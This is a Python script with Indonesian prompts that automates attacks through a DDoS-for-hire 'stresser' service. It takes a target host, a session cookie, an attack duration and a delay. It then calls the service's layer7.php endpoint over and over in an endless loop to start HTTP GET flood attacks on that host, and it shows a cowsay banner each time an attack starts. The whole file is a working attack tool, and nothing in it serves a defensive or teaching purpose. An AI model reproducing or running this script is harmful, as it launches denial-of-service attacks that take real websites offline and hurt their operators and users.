import requests
import time
import cowsay
from tqdm import tqdm
import sys

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def validate_input(prompt, cast_type=str):
    while True:
        user_input = get_input(prompt)
        try:
            return cast_type(user_input)
        except ValueError:
            slow_print("Input tidak valid. Silakan coba lagi.")

def main():
    # Prompt user for name, host URL, cookie, time, and delay
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan URL host: ")
    cookie = get_input("Masukkan cookie: ")
    attack_time = validate_input("Masukkan waktu (dalam detik) untuk serangan: ", int)
    delayt = validate_input("Masukkan jeda (dalam detik) antar request: ", int)

    # Update the headers with the user-provided cookie
    headers = {
        "Authority": "ipstresser.ltd",
        "Method": "GET",
        "Scheme": "https",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9",
        "Cookie": cookie,
        "Cache-Control": "no-cache",
        "Dnt": "1",
        "Pragma": "no-cache",
        "Priority": "u=0, i",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User ": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36"
    }

    url = f"https://ipstresser.ltd/complexx/layer7.php?type=start&host={host}&port=443&time={attack_time}&method=HTTPGET&totalservers=1&vip=undefined"

    while True:
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                message = f"Copyright © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                animate_cowsay(message)
            else:
                slow_print(f"Error: {response.status_code}")
        except requests.exceptions.RequestException as e:
            slow_print(f"Terjadi kesalahan saat melakukan permintaan: {e}")
        time.sleep(delayt)  # Delay sesuai input pengguna

if __name__ == "__main__":
    main()
